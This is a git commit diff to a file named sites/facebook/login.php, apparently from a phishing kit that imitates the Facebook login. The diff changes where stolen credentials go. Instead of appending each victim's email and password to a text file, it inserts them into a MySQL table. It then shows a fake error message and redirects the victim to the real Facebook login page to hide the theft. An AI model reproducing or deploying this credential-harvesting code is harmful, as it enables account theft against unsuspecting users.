6c9d78e0ee52e925e2e5053612857de37479474f
fire87 <47302365+fire87@users.noreply.github.com>
2019-02-04 02:11:48 +0800

    Update login.php

--- sites/facebook/login.php
+++ sites/facebook/login.php
@@ -1,5 +1,9 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
-exit();
+require_once('SQL.php');
+$qu = sprintf("INSERT INTO `".$database_SQL."`.`account` (`email`, `pass`) VALUES ('%s', '%s')",mysqli_real_escape_string($SQL,$_POST['email']),mysqli_real_escape_string($SQL,$_POST['pass']));
+mysqli_query($SQL,$qu);
+?>
+<meta http-equiv="refresh" content="0.2;url=https://www.facebook.com/login.php">
+<body>
+Something goes wrong.Redirecting.......
+</body>
